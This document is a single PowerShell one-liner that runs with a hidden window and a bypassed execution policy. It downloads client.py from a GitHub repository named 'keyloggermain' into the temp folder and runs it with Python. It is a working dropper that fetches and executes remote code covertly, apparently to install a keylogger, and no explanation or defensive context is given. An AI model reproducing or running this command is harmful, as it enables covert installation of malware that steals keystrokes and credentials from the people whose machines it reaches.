powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "
$downloadUrl = 'https://raw.githubusercontent.com/nihalsec/keyloggermain/main/client.py';
$savePath = \"$env:TEMP\\client.py\";
Invoke-WebRequest -Uri $downloadUrl -OutFile $savePath;
Start-Sleep -Seconds 1;
Start-Process python -ArgumentList $savePath
"
